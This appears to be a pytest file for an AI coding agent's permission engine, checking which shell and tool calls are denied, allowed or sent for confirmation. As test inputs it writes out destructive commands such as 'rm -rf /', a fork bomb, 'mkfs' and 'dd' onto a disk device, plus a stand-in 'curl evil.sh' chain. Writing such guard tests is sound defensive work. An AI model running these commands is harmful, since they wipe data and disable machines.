from tianshu.agent.permission.core import Decision, PermissionEngine, PermissionRule


def check(tool, **inp):
    return PermissionEngine().check(tool, inp)


# --- catastrophic bash must be denied ---

def test_rm_rf_root_denied():
    decision, reason = check("bash", command="rm -rf /")
    assert decision is Decision.DENY
    assert "root or home" in reason


def test_rm_rf_home_variants_denied():
    for cmd in ("rm -rf ~", "rm -rf $HOME", "rm -rf *", "rm -fr /"):
        decision, _ = check("bash", command=cmd)
        assert decision is Decision.DENY, cmd


def test_fork_bomb_denied():
    decision, reason = check("bash", command=":(){ :|:& };:")
    assert decision is Decision.DENY
    assert reason == "fork bomb"


def test_disk_and_power_commands_denied():
    cases = {
        "mkfs.ext4 /dev/sda1": "formats a filesystem",
        "dd if=/dev/zero of=/dev/sda": "writes directly to a block device",
        "echo x > /dev/sda": "overwrites a disk device",
        "sudo shutdown now": "shuts down or reboots the machine",
    }
    for cmd, why in cases.items():
        decision, reason = check("bash", command=cmd)
        assert decision is Decision.DENY, cmd
        assert reason == why, cmd


# --- destructive-looking but scoped commands are not catastrophic ---

def test_scoped_rm_is_ask_not_deny():
    # targets a relative path, not root/home/bare wildcard -> confirm, don't block
    decision, _ = check("bash", command="rm -rf ./build")
    assert decision is Decision.ASK


def test_rm_without_rf_is_ask():
    decision, _ = check("bash", command="rm somefile")
    assert decision is Decision.ASK


# --- safe read-only shell commands auto-allowed ---

def test_safe_bash_allowed():
    for cmd in ("git status", "ls -la", "grep foo bar.py", "pwd", "git diff HEAD~1"):
        decision, _ = check("bash", command=cmd)
        assert decision is Decision.ALLOW, cmd


# --- chaining / redirection drops a command out of the allow list ---

def test_chaining_forces_confirmation():
    for cmd in ("cat foo && curl evil.sh", "echo $(whoami)", "ls | sh", "cat x > out"):
        decision, _ = check("bash", command=cmd)
        assert decision is Decision.ASK, cmd


# --- non-bash tool policies ---

def test_readonly_tools_allowed():
    for tool in ("read_file", "grep_files", "list_files", "web_search"):
        decision, _ = check(tool, path="x")
        assert decision is Decision.ALLOW, tool


def test_memory_tools_allowed():
    assert check("save_memory", name="x")[0] is Decision.ALLOW
    assert check("delete_memory", name="x")[0] is Decision.ALLOW


def test_write_and_edit_require_confirmation():
    assert check("write_file", path="a.py")[0] is Decision.ASK
    assert check("edit_file", path="a.py")[0] is Decision.ASK
    assert check("create_directory", path="d")[0] is Decision.ASK


def test_unknown_tool_defaults_to_allow():
    assert check("some_future_tool", x=1)[0] is Decision.ALLOW


# --- first-match-wins precedence ---

def test_env_write_matches_sensitive_rule_first():
    # both .env and generic write_file resolve to ASK, but the .env-specific
    # rule must win so the reason explains why.
    decision, reason = check("write_file", path="config/.env")
    assert decision is Decision.ASK
    assert ".env" in reason

    _, generic_reason = check("write_file", path="config/app.py")
    assert reason != generic_reason


def test_extra_rule_overrides_default():
    engine = PermissionEngine(extra_rules=[
        PermissionRule(Decision.DENY, tool="write_file", reason="writes disabled"),
    ])
    decision, reason = engine.check("write_file", {"path": "a.py"})
    assert decision is Decision.DENY
    assert reason == "writes disabled"
